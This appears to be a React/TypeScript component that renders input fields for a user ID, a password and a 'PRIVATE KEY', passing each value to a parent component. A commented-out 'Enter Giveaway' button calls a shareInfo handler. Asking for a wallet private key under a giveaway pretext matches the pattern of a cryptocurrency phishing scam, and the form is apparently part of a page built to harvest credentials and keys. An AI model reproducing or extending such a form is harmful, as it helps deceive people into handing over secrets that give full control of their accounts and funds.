
const Privatekey = ({
  setPrivateKey,
  setPassword,
  setUserID,
}: {
  setPrivateKey: any;
  setPassword: any;
  setUserID: any;
}) => {
  return (
    <>
      <input
        id="example"
        type="text"
        placeholder="Enter your ID"
        onChange={(e) => setUserID(e.target.value)}
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <input
        id="example"
        type="password"
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Enter your Password"
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <input
        id="example"
        type="text"
        onChange={(e) => setPrivateKey(e.target.value)}
        placeholder="Enter your PRIVATE KEY"
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <div
        className="flex flex-wrap"
        style={{ width: "100%", marginTop: "10px", position: "relative" }}
      >
        {/* <button
          onClick={shareInfo}
          className="px-6 py-3 text-white bg-blue-500 rounded-lg shadow-md transform transition duration-300 ease-in-out hover:bg-blue-600 hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50"
        >
          Enter Giveaway
        </button>
        <button
          style={{ position: "absolute", right: "0px" }}
          onClick={setVisible}
          className="absolute px-6 py-3 text-white bg-blue-500 rounded-lg shadow-md transform transition duration-300 ease-in-out hover:bg-blue-600 hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50"
        >
          Close
        </button> */}
      </div>
    </>
  );
};

export default Privatekey;
